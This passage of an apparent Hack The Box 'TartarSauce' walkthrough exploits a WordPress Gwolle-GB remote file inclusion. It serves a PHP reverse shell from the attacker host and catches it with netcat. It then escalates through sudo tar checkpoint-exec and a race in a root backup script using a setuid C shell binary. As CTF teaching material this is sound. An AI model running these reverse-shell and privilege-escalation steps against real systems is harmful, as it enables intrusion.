+                WordPress&nbsp;Plugin&nbsp;Gwolle&nbsp;Guestbook&nbsp;1.5.3&nbsp;-&nbsp;Remote&nbsp;File&nbsp;Inclusion&nbsp;&nbsp;exploits<span style="color:#ff9d00;font-weight:700">/</span>php<span style="color:#ff9d00;font-weight:700">/</span>webapps<span style="color:#ff9d00;font-weight:700">/</span>38861.txt<br>
+                ---------------------------------------------------------------------------------------------
+            </div>
+        </div><br>
+        <br>
+        Gwolle-GB vuln - <a href="https://www.exploit-db.com/exploits/38861">https://www.exploit-db.com/exploits/38861</a><br>
+        <br>
+        However, <code>wpscan</code> reported <code>gwolle-gb</code> as version <code>2.3.10</code>.<br>
+        <br>
+        I'd run out of options of what to try next, so I just decided to try the gwolle-gb RFI exploit and it worked (despite the version numbers not matching up).<br>
+        <br>
+        Turns out, if you check the Changelog in the readmet that wpscan found - <code>http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/readme.txt</code> - you'll see that the creator is messing with us - <code>* Changed version from 1.5.3 to 2.3.10 to trick wpscan ;D</code>. (Note to box creators: don't do this. This doesn't make a fun or interesting box.)<br>
+        <br>
+        <a id="h1-2" name="h1-2"></a><strong></strong>
+        <h1><strong>Gain Access</strong></h1>
+        <br>
+        <a id="h2-2" name="h2-2"></a><strong></strong>
+        <h2><strong>3) gwolle-gb RFI</strong></h2><br>
+        <a href="https://www.exploit-db.com/exploits/38861">https://www.exploit-db.com/exploits/38861</a><br>
+        <br>
+        To exploit gwolle-gb, you need to create a <code>wp-load.php</code> file containing a reverse shell, and serve it to the target.<br>
+        I used pentestmonkey's <code>php-reverse-shell.php</code> from <code>/usr/share/webshells</code>.<br>
+        Modify the <code>$ip</code> and <code>$port</code> lines to that of your attacking system.<br>
+        Serve the file using <code>python -m SimpleHTTPServer</code>.<br>
+        <br>
+            <div class="codebox">
+                ┌─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>tartarsauce]<br>
+                └──╼&nbsp;<span style="color:#0088ff;font-weight:400">#cp&nbsp;/usr/share/webshells/php/php-reverse-shell.php&nbsp;wp-load.php</span><br>
+                ┌─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>tartarsauce]<br>
+                └──╼&nbsp;<span style="color:#0088ff;font-weight:400">#nano&nbsp;wp-load.php</span><br>
+                [...]<br>
+                &lt;?php<br>
+                <br>
+                set_time_limit&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>0<span style="color:#ff9d00;font-weight:700">);</span><br>
+                <span style="color:#7f0044;font-weight:400">$VERSION</span>&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">"1.0"</span><span style="color:#ff9d00;font-weight:700">;</span><br>
+                <span style="color:#7f0044;font-weight:400">$ip</span>&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">'10.10.14.12'</span><span style="color:#ff9d00;font-weight:700">;</span>&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">//</span>&nbsp;CHANGE&nbsp;THIS<br>
+                <span style="color:#7f0044;font-weight:400">$port</span>&nbsp;=&nbsp;9001<span style="color:#ff9d00;font-weight:700">;</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">//</span>&nbsp;CHANGE&nbsp;THIS<br>
+                <span style="color:#7f0044;font-weight:400">$chunk_size</span>&nbsp;=&nbsp;1400<span style="color:#ff9d00;font-weight:700">;</span><br>
+                [...]<br>
+                ┌─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>tartarsauce]<br>
+                └──╼&nbsp;<span style="color:#0088ff;font-weight:400">#python&nbsp;-m&nbsp;SimpleHTTPServer&nbsp;</span><br>
+                Serving&nbsp;HTTP&nbsp;on&nbsp;0.0.0.0&nbsp;port&nbsp;8000&nbsp;...
+            </div>
+        </div><br>
+        <br>
+        Start a listener to receive the shell.<br>
+            <div class="codebox">
+                ┌─[✗]─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf]<br>
+                └──╼&nbsp;<span style="color:#0088ff;font-weight:400">#nc&nbsp;-lvnp&nbsp;9001</span><br>
+                listening&nbsp;on&nbsp;[any]&nbsp;9001&nbsp;...
+            </div>
+        </div><br>
+        <br>
+        And browse to the RFI URL and include your php reverse shell.<br>
+        <code>http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://10.10.14.12:8000/</code><br>
+        <br>
+        You should receive a shell on your listener.<br>
+        Upgrade to an interactive shell with <code>python -c 'import pty; pty.spawn("/bin/bash")'</code>.<br>
+            <div class="codebox">
+                [...]<br>
+                listening&nbsp;on&nbsp;[any]&nbsp;9001&nbsp;...<br>
+                connect&nbsp;to&nbsp;[10.10.14.12]&nbsp;from&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>UNKNOWN<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;[10.10.10.88]&nbsp;48042<br>
+                Linux&nbsp;TartarSauce&nbsp;4.15.0-041500-generic&nbsp;<span style="color:#0088ff;font-weight:400">#201802011154&nbsp;SMP&nbsp;Thu&nbsp;Feb&nbsp;1&nbsp;12:05:23&nbsp;UTC&nbsp;2018&nbsp;i686&nbsp;athlon&nbsp;i686&nbsp;GNU/Linux</span><br>
+                &nbsp;05<span style="color:#ff9d00;font-weight:700">:</span>01<span style="color:#ff9d00;font-weight:700">:</span>42&nbsp;up&nbsp;28&nbsp;min,&nbsp;&nbsp;0&nbsp;users,&nbsp;&nbsp;load&nbsp;average<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;0.03,&nbsp;0.07,&nbsp;0.03<br>
+                USER&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;TTY&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;FROM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;LOGIN@&nbsp;&nbsp;&nbsp;IDLE&nbsp;&nbsp;&nbsp;JCPU&nbsp;&nbsp;&nbsp;PCPU&nbsp;WHAT<br>
+                <span style="color:#7f0044;font-weight:400">uid</span>=33<span style="color:#ff9d00;font-weight:700">(</span>www-data<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;gid=33<span style="color:#ff9d00;font-weight:700">(</span>www-data<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;<span style="color:#ff9d00;font-weight:700">groups</span>=33<span style="color:#ff9d00;font-weight:700">(</span>www-data<span style="color:#ff9d00;font-weight:700">)</span><br>
+                <span style="color:#ff9d00;font-weight:700">/</span>bin<span style="color:#ff9d00;font-weight:700">/sh:</span>&nbsp;0<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;cant&nbsp;access&nbsp;tty<span style="color:#ff9d00;font-weight:700">;</span>&nbsp;job&nbsp;control&nbsp;turned&nbsp;off<br>
+                $&nbsp;<span style="color:#ff9d00;font-weight:700">id</span><br>
+                <span style="color:#7f0044;font-weight:400">uid</span>=33<span style="color:#ff9d00;font-weight:700">(</span>www-data<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;gid=33<span style="color:#ff9d00;font-weight:700">(</span>www-data<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;<span style="color:#ff9d00;font-weight:700">groups</span>=33<span style="color:#ff9d00;font-weight:700">(</span>www-data<span style="color:#ff9d00;font-weight:700">)</span><br>
+                $&nbsp;python&nbsp;-c&nbsp;<span style="color:#3ad900;font-weight:400">'import&nbsp;pty;&nbsp;pty.spawn("/bin/bash")'</span><br>
+                www-data@TartarSauce<span style="color:#ff9d00;font-weight:700">:/</span>$&nbsp;<br>
+            </div>
+        </div><br>
+        <br>
+        <a id="h1-3" name="h1-3"></a><strong></strong>
+        <h1><strong>Priv-Esc to onuma</strong></h1>
+        <br>
+        <a id="h2-3" name="h2-3"></a><strong></strong>
+        <h2><strong>4) tar Command Execution</strong></h2><br>
+        Check what <code>www-data</code> can with <code>sudo</code>.<br>
+            <div class="codebox">
+                www-data@TartarSauce<span style="color:#ff9d00;font-weight:700">:/</span>tmp<span style="color:#ff9d00;font-weight:700">/</span>lec$&nbsp;<span style="color:#ff9d00;font-weight:700">sudo</span>&nbsp;-l<br>
+                Matching&nbsp;Defaults&nbsp;entries&nbsp;<span style="color:#ff9d00;font-weight:700">for</span>&nbsp;<span style="color:#7f0044;font-weight:400">www</span>-data&nbsp;on&nbsp;TartarSauce:<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;env_reset,&nbsp;mail_badpass,<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin<br>
+                <br>
+                User&nbsp;www-data&nbsp;may&nbsp;run&nbsp;the&nbsp;following&nbsp;commands&nbsp;on&nbsp;TartarSauce:<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;(onuma)&nbsp;NOPASSWD:&nbsp;/bin/tar
+            </div>
+        </div><br>
+        <br>
+        <code>www-data</code> can run <code>tar</code> as <code>onuma</code> without providing a password.<br>
+        <br>
+        Tar can be manipulated to run system commands.<br>
+        With this, we can get a shell as <code>onuma</code>.<br>
+        <br>
+        A good place to check for functionality like this in standard binaries is <code>gtfobins</code> - <a href="https://gtfobins.github.io/gtfobins/tar/">https://gtfobins.github.io/gtfobins/tar/</a><br>
+        <br>
+            <div class="codebox">
+                www-data@TartarSauce<span style="color:#ff9d00;font-weight:700">:/</span>tmp<span style="color:#ff9d00;font-weight:700">/</span>lec$&nbsp;<span style="color:#ff9d00;font-weight:700">sudo</span>&nbsp;-u&nbsp;onuma&nbsp;<span style="color:#ff9d00;font-weight:700">tar</span>&nbsp;-cf&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>dev<span style="color:#ff9d00;font-weight:700">/</span>null&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>dev<span style="color:#ff9d00;font-weight:700">/</span>null&nbsp;--checkpoint=1&nbsp;--checkpoint-action=exec=<span style="color:#ff9d00;font-weight:700">/</span>bin<span style="color:#ff9d00;font-weight:700">/bash</span><br>
+                &lt;<span style="color:#ff9d00;font-weight:700">/</span>dev<span style="color:#ff9d00;font-weight:700">/</span>null&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>dev<span style="color:#ff9d00;font-weight:700">/</span>null&nbsp;--checkpoint=1&nbsp;--checkpoint-action=exec=<span style="color:#ff9d00;font-weight:700">/</span>bin<span style="color:#ff9d00;font-weight:700">/bash</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                <span style="color:#ff9d00;font-weight:700">tar:</span>&nbsp;Removing&nbsp;leading&nbsp;<span style="color:#333333;font-weight:400">`/&nbsp;from&nbsp;member&nbsp;names<br>
+                onuma@TartarSauce:/tmp/lec$&nbsp;cat&nbsp;~/user.txt<br>
+                cat&nbsp;~/user.txt<br>
+                b2d6ec454...</span>
+            </div>
+        </div><br>
+        <br>
+        <a id="h1-4" name="h1-4"></a><strong></strong>
+        <h1><strong>Priv-Esc to root</strong></h1>
+        <br>
+        <a id="h2-4" name="h2-4"></a><strong></strong>
+        <h2><strong>5) /usr/sbin/backuperer</strong></h2><br>
+        Check for files that <code>onuma</code> owns.<br>
+            <div class="codebox">
+                onuma@TartarSauce<span style="color:#ff9d00;font-weight:700">:/</span>tmp<span style="color:#ff9d00;font-weight:700">/</span>lec$&nbsp;<span style="color:#ff9d00;font-weight:700">find</span>&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>&nbsp;-user&nbsp;onuma&nbsp;2&gt;<span style="color:#ff9d00;font-weight:700">/</span>dev<span style="color:#ff9d00;font-weight:700">/</span>null&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;<span style="color:#ff9d00;font-weight:700">grep</span>&nbsp;-v&nbsp;proc<br>
+                <span style="color:#ff9d00;font-weight:700">/</span>var<span style="color:#ff9d00;font-weight:700">/</span>backups<span style="color:#ff9d00;font-weight:700">/</span>onuma-www-dev.bak<br>
+                <span style="color:#ff9d00;font-weight:700">/</span>home<span style="color:#ff9d00;font-weight:700">/</span>onuma<br>
+                <span style="color:#ff9d00;font-weight:700">/</span>home<span style="color:#ff9d00;font-weight:700">/</span>onuma<span style="color:#ff9d00;font-weight:700">/</span>.cache<br>
+                <span style="color:#ff9d00;font-weight:700">/</span>home<span style="color:#ff9d00;font-weight:700">/</span>onuma<span style="color:#ff9d00;font-weight:700">/</span>.cache<span style="color:#ff9d00;font-weight:700">/</span>motd.legal-displayed<br>
+                <span style="color:#ff9d00;font-weight:700">/</span>home<span style="color:#ff9d00;font-weight:700">/</span>onuma<span style="color:#ff9d00;font-weight:700">/</span>.mysql_history<br>
+                [...]
+            </div>
+        </div><br>
+        <br>
+        <code>onuma</code> owns a backup file - <code>/var/backups/onuma-www-dev.bak</code>.<strong><br></strong>If you extract it you'll see that it's a backup of <code>/var/www/html</code>.<br>
+        <br>
+        Because this is a backup file, I decided to look for a job that might be creating this backup.<br>
+        <br>
+        There's nothing in cron, but the systemd timers show a <code>backuperer.service</code> running every 5 minutes.<br>
+        (you'll have to set a terminal before you can use <code>watch</code> and <code>systemctl list-timers</code>).<br>
+            <div class="codebox">
+                onuma@TartarSauce<span style="color:#ff9d00;font-weight:700">:/</span>tmp<span style="color:#ff9d00;font-weight:700">/</span>lec$&nbsp;<span style="color:#ff9d00;font-weight:700">export</span>&nbsp;<span style="color:#7f0044;font-weight:400">TERM</span>=xterm-256color<br>
+                onuma@TartarSauce<span style="color:#ff9d00;font-weight:700">:/</span>tmp<span style="color:#ff9d00;font-weight:700">/</span>lec$&nbsp;watch&nbsp;-n&nbsp;1&nbsp;‘systemctl&nbsp;list-timers’<br>
+                Every&nbsp;1.0s<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;systemctl&nbsp;list-timers&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Mon&nbsp;Oct&nbsp;28&nbsp;09<span style="color:#ff9d00;font-weight:700">:</span>44<span style="color:#ff9d00;font-weight:700">:</span>47&nbsp;2019<br>
+                <br>
+                NEXT&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;LEFT&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;LAST&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;PASSED<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;UNIT&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ACTIVATES<br>
+                Mon&nbsp;2019-10-28&nbsp;09<span style="color:#ff9d00;font-weight:700">:</span>48<span style="color:#ff9d00;font-weight:700">:</span>54&nbsp;EDT&nbsp;&nbsp;4min&nbsp;7s&nbsp;left&nbsp;Mon&nbsp;2019-10-28&nbsp;09<span style="color:#ff9d00;font-weight:700">:</span>43<span style="color:#ff9d00;font-weight:700">:</span>54&nbsp;EDT&nbsp;&nbsp;52s&nbsp;ago&nbsp;<br>
+                backuperer.timer&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;backuperer.service<br>
+                [...]<br>
+                <br>
+                4&nbsp;timers&nbsp;listed.<br>
+                Pass&nbsp;--all&nbsp;to&nbsp;see&nbsp;loaded&nbsp;but&nbsp;inactive&nbsp;timers,&nbsp;too.<br>
+                <br>
+                <span style="color:#ff9d00;font-weight:700">(</span>I&nbsp;couldn<span style="color:#3ad900;font-weight:400">'t&nbsp;exit&nbsp;this&nbsp;without&nbsp;Ctrl&nbsp;+&nbsp;C.&nbsp;<br>
+                So&nbsp;I&nbsp;Ctrl&nbsp;+&nbsp;C'</span>d&nbsp;and&nbsp;ran&nbsp;the&nbsp;RFI&nbsp;and&nbsp;priv-esc&nbsp;again&nbsp;to&nbsp;get&nbsp;my&nbsp;shell&nbsp;back<span style="color:#ff9d00;font-weight:700">)</span>.
+            </div>
+        </div><br>
+        <br>
+        I downloaded pspy from attacking system and ran it to see what this service is doing every 5 minutes.<br>
+        <a href="https://github.com/DominicBreuker/pspy">https://github.com/DominicBreuker/pspy</a><br>
+            <div class="codebox">
+                onuma@TartarSauce<span style="color:#ff9d00;font-weight:700">:/</span>tmp<span style="color:#ff9d00;font-weight:700">/</span>lec$&nbsp;<span style="color:#ff9d00;font-weight:700">wget</span>&nbsp;-q&nbsp;http<span style="color:#ff9d00;font-weight:700">://</span>10.10.14.12<span style="color:#ff9d00;font-weight:700">:</span>8000<span style="color:#ff9d00;font-weight:700">/</span>pspy32s<br>
+                onuma@TartarSauce<span style="color:#ff9d00;font-weight:700">:/</span>tmp<span style="color:#ff9d00;font-weight:700">/</span>lec$&nbsp;.<span style="color:#ff9d00;font-weight:700">/</span>pspy32s<br>
+                2019<span style="color:#ff9d00;font-weight:700">/</span>10<span style="color:#ff9d00;font-weight:700">/</span>28&nbsp;06<span style="color:#ff9d00;font-weight:700">:</span>54<span style="color:#ff9d00;font-weight:700">:</span>14&nbsp;CMD<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;UID=0&nbsp;&nbsp;&nbsp;&nbsp;PID=18554&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>bin<span style="color:#ff9d00;font-weight:700">/tar</span>&nbsp;-zxvf&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>var<span style="color:#ff9d00;font-weight:700">/</span>tmp<span style="color:#ff9d00;font-weight:700">/</span>.1a06337eb78ebfb696ed05b28439cd75c2616939&nbsp;-C&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>var<span style="color:#ff9d00;font-weight:700">/</span>tmp<span style="color:#ff9d00;font-weight:700">/</span>check&nbsp;<br>
+                2019<span style="color:#ff9d00;font-weight:700">/</span>10<span style="color:#ff9d00;font-weight:700">/</span>28&nbsp;06<span style="color:#ff9d00;font-weight:700">:</span>54<span style="color:#ff9d00;font-weight:700">:</span>14&nbsp;CMD<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;UID=0&nbsp;&nbsp;&nbsp;&nbsp;PID=18555&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;<span style="color:#ff9d00;font-weight:700">gzip</span>&nbsp;-d&nbsp;<br>
+                2019<span style="color:#ff9d00;font-weight:700">/</span>10<span style="color:#ff9d00;font-weight:700">/</span>28&nbsp;06<span style="color:#ff9d00;font-weight:700">:</span>54<span style="color:#ff9d00;font-weight:700">:</span>15&nbsp;CMD<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;UID=0&nbsp;&nbsp;&nbsp;&nbsp;PID=18557&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>bin<span style="color:#ff9d00;font-weight:700">/bash</span>&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>usr<span style="color:#ff9d00;font-weight:700">/</span>sbin<span style="color:#ff9d00;font-weight:700">/</span>backuperer&nbsp;<br>
+                2019<span style="color:#ff9d00;font-weight:700">/</span>10<span style="color:#ff9d00;font-weight:700">/</span>28&nbsp;06<span style="color:#ff9d00;font-weight:700">:</span>54<span style="color:#ff9d00;font-weight:700">:</span>15&nbsp;CMD<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;UID=0&nbsp;&nbsp;&nbsp;&nbsp;PID=18556&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>bin<span style="color:#ff9d00;font-weight:700">/bash</span>&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>usr<span style="color:#ff9d00;font-weight:700">/</span>sbin<span style="color:#ff9d00;font-weight:700">/</span>backuperer&nbsp;<br>
+                2019<span style="color:#ff9d00;font-weight:700">/</span>10<span style="color:#ff9d00;font-weight:700">/</span>28&nbsp;06<span style="color:#ff9d00;font-weight:700">:</span>54<span style="color:#ff9d00;font-weight:700">:</span>15&nbsp;CMD<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;UID=0&nbsp;&nbsp;&nbsp;&nbsp;PID=18558&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>bin<span style="color:#ff9d00;font-weight:700">/mv</span>&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>var<span style="color:#ff9d00;font-weight:700">/</span>tmp<span style="color:#ff9d00;font-weight:700">/</span>.1a06337eb78ebfb696ed05b28439cd75c2616939&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>var<span style="color:#ff9d00;font-weight:700">/</span>backups<span style="color:#ff9d00;font-weight:700">/</span>onuma-www-dev.bak&nbsp;<br>
+                2019<span style="color:#ff9d00;font-weight:700">/</span>10<span style="color:#ff9d00;font-weight:700">/</span>28&nbsp;06<span style="color:#ff9d00;font-weight:700">:</span>54<span style="color:#ff9d00;font-weight:700">:</span>15&nbsp;CMD<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;UID=0&nbsp;&nbsp;&nbsp;&nbsp;PID=18559&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>bin<span style="color:#ff9d00;font-weight:700">/rm</span>&nbsp;-rf&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>var<span style="color:#ff9d00;font-weight:700">/</span>tmp<span style="color:#ff9d00;font-weight:700">/</span>check
+            </div>
+        </div><br>
+        <br>
+        It's look like it's creating tar archives, and running <code>/usr/sbin/backuperer</code>.<br>
+        <br>
+        <a id="h3-5" name="h3-5"></a><strong></strong>
+        <h3><strong>5a) Investigate /usr/sbin/backuperer</strong></h3><br>
+        <code>/usr/sbin/backuperer</code> is a shell script that we don't have write access to.<br>
+            <div class="codebox">
+                onuma@TartarSauce<span style="color:#ff9d00;font-weight:700">:/</span>$&nbsp;<span style="color:#ff9d00;font-weight:700">ls</span>&nbsp;-alh&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>usr<span style="color:#ff9d00;font-weight:700">/</span>sbin<span style="color:#ff9d00;font-weight:700">/</span>backuperer<br>
+                -rwxr-xr<span style="color:#ffdd00;font-weight:400">-x</span>&nbsp;1&nbsp;root&nbsp;root&nbsp;1.7K&nbsp;Feb&nbsp;21&nbsp;&nbsp;2018&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>usr<span style="color:#ff9d00;font-weight:700">/</span>sbin<span style="color:#ff9d00;font-weight:700">/</span>backuperer<br>
+                onuma@TartarSauce<span style="color:#ff9d00;font-weight:700">:/</span>$&nbsp;<span style="color:#ff9d00;font-weight:700">file</span>&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>usr<span style="color:#ff9d00;font-weight:700">/</span>sbin<span style="color:#ff9d00;font-weight:700">/</span>backuperer<br>
+                <span style="color:#ff9d00;font-weight:700">/</span>usr<span style="color:#ff9d00;font-weight:700">/</span>sbin<span style="color:#ff9d00;font-weight:700">/</span>backuperer<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;Bourne-Again&nbsp;shell&nbsp;script,&nbsp;UTF-8&nbsp;Unicode&nbsp;text&nbsp;executable<br>
+                onuma@TartarSauce<span style="color:#ff9d00;font-weight:700">:/</span>$&nbsp;<span style="color:#ff9d00;font-weight:700">cat</span>&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>usr<span style="color:#ff9d00;font-weight:700">/</span>sbin<span style="color:#ff9d00;font-weight:700">/</span>backuperercx<br>
+                [...]
+            </div>
+        </div><br>
+        <br>
+        <strong>Here's a breakdown of the script:</strong><br>
+        <code>$tmpfile</code> is a hidden file. Its file name is a sha1 hash of a randomly generated number.<br>
+        <br>
+        1. <code>/usr/bin/sudo -u onuma /bin/tar -zcvf $tmpfile $basedir &amp;</code><br>
+        <code>/var/www/html</code> gets tar archived in <code>/var/tmp/.&lt;random sha1h hash&gt;</code><br>
+        <br>
+        2. <code>/bin/sleep 30</code><br>
+        The script sleeps for 30 seconds<br>
+        <br>
+        3. <code>/bin/mkdir $check</code><br>
+        The script makes a <code>/var/tmp/check</code> directory<br>
+        <br>
+        4. <code>/bin/tar -zxvf $tmpfile -C $check</code><br>
+        The script extracts <code>/var/tmp/.&lt;random sha1h hash&gt;</code> into <code>check/</code><br>
+        <br>
+        5. <code>if [[ $(integrity_chk) ]]</code><br>
+        The script runs <code>diff</code> against <code>/var/www/html</code> and <code>/var/tmp/check/var/www/html</code><br>
+        If the 2 are different, and error is recorded and the files are left where they are.<br>
+        If the 2 are the same, <code>/var/tmp/.&lt;random sha1h hash&gt;</code> is copied to <code>/var/backups/onuma-www-dev.bak</code> and the <code>check</code> directory and <code>.&lt;random sha1 hash&gt;</code> file are deleted.<br>
+        <br>
+        The vulnerability in this script lies in 2 commands - <code>/bin/sleep 30</code> and <code>/bin/tar -zxvf $tmpfile -C $check</code>.<br>
+        <br>
+        <a id="h3-6" name="h3-6"></a><strong></strong>
+        <h3><strong>5b) How to exploit /usr/sbin/backuperer?</strong></h3><br>
+        <code>/bin/tar -zxvf $tmpfile -C $check</code> in the backuperer script runs as root.<br>
+        It extracts the <code>/var/tmp/.&lt;random sha1h hash&gt;</code> gzip archive into <code>check/</code>.<br>
+        <br>
+        Any files that are owned by root inside of <code>/var/tmp/.&lt;random sha1h hash&gt;</code> <em>will still be root</em> after they're extracted (because <code>/var/tmp/.&lt;random sha1 hash&gt;</code> is being extracted by root).<br>
+        <br>
+        Because the script sleeps for 30 seconds, we are given the chance to modify the <code>/var/tmp/.&lt;random sha1h hash&gt;</code> file, which is owned by <code>onuma</code>.<br>
+        We replace the <code>/var/tmp/.&lt;random sha1h hash&gt;</code> gzip archive with our own archive containing a SUID binary.<br>
+        <br>
+        When the script runs the <code>integrity_chk()</code> function, it will see that the contents of <code>/var/tmp/check/var/www/html</code> (which contains our SUID binary) and <code>/var/www/html</code> (which contains the website) are not the same, and will leave the extracted files where they are. We'll be left with a SUID binary owned by root in <code>/check</code> which is executable by everyone that we can use to priv-esc to root.<br>
+        <br>
+        <a id="h2-5" name="h2-5"></a><strong></strong>
+        <h2><strong>6) Exploit /usr/sbin/backuperer</strong></h2><br>
+        <br>
+        <a id="h3-7" name="h3-7"></a><strong></strong>
+        <h3><strong>6a) Compile SUID binary &amp; create archive</strong></h3><br>
+        <code>gcc</code> isn't installed on the TartarSauce, so write and compile the SUID binary on your attacking system.<br>
+        TartarSauce is 32bit, so compile for a 32bit system using <code>-m32</code> bit.<br>
+        If you get an error, install <code>gcc-multilib</code>.<br>
+            <div class="codebox">
+                ┌─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>tartarsauce]<br>
+                └──╼&nbsp;<span style="color:#0088ff;font-weight:400">#nano&nbsp;rootme.c</span><br>
+                <span style="color:#0088ff;font-weight:400">#include&nbsp;&lt;stdio.h&gt;</span><br>
+                <span style="color:#0088ff;font-weight:400">#include&nbsp;&lt;stdlib.h&gt;</span><br>
+                <span style="color:#0088ff;font-weight:400">#include&nbsp;&lt;sys/types.h&gt;</span><br>
+                <span style="color:#0088ff;font-weight:400">#include&nbsp;&lt;unistd.h&gt;</span><br>
+                <br>
+                int&nbsp;main<span style="color:#ff9d00;font-weight:700">(</span>void<span style="color:#ff9d00;font-weight:700">)</span><br>
+                <span style="color:#ff9d00;font-weight:700">{</span><br>
+                setuid<span style="color:#ff9d00;font-weight:700">(</span>0<span style="color:#ff9d00;font-weight:700">);</span><br>
+                setgid<span style="color:#ff9d00;font-weight:700">(</span>0<span style="color:#ff9d00;font-weight:700">);</span><br>
+                system<span style="color:#ff9d00;font-weight:700">(</span><span style="color:#3ad900;font-weight:400">"/bin/bash"</span><span style="color:#ff9d00;font-weight:700">);</span><br>
+                <span style="color:#ff9d00;font-weight:700">}</span><br>
+                ┌─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>tartarsauce]<br>
+                └──╼&nbsp;<span style="color:#0088ff;font-weight:400">#gcc&nbsp;rootme.c&nbsp;-o&nbsp;rootme&nbsp;-m32</span>
+            </div>
+        </div><br>
+        <br>
+        Now set up the archive.<br>
+        The SUID binary needs to be in a <code>var/www/html/</code> directory.<br>
+            <div class="codebox">
+                ┌─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>tartarsauce]<br>
+                └──╼&nbsp;<span style="color:#0088ff;font-weight:400">#mkdir&nbsp;-p&nbsp;var/www/html</span><br>
